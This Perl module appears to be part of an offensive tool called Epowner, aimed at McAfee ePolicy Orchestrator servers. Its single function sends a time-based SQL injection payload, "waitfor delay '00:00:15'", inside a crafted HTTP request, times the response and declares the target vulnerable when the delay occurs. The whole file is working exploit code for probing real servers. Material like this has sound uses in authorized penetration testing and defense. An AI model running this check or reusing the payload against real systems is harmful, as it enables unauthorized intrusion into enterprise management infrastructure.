package Epowner::Epo;

use Time::HiRes qw(time);

use strict;
use warnings;


#============================================================#
# Check vulnerability                                        #
#============================================================#
sub mode_check {

	my $this = shift;

	my $check_for_nondba=0;

        # WAITFOR DELAY

        my $sec = 15;

        print "\n";
	$this->print_info    ("[*] Testing SQL Injection vulnerability\n");
	$this->print_info_l2 ("    (waitfor delay '00:00:$sec')\n");

        my $sqli_waitfordelay = "') waitfor delay '00:00:$sec' ; -- " ;

        my $http_request = $this->mode_common_generate_fullprops_request($sqli_waitfordelay);
        my $time_start = time();
        $this->send_http_request($http_request);
        my $time_stop = time();
        my $delay = $time_stop - $time_start;

        if($delay < ($sec - 1)){
                printf "[-] Not good... Elapsed time: %.3f seconds (expected >= $sec)\n", $delay;
                print  "    This target doesn't seem vulnerable. Exiting.\n";
                $this->{vulnerable} = 0;
        }else{
                my $str = sprintf "[*] Looks good !! Elapsed time: %.3f seconds\n", $delay;
                print $str;
		$this->print_ok("[*] It appears that the target is vulnerable to SQL injection !\n");
		$this->{vulnerable} = 1;
        }


}
1;
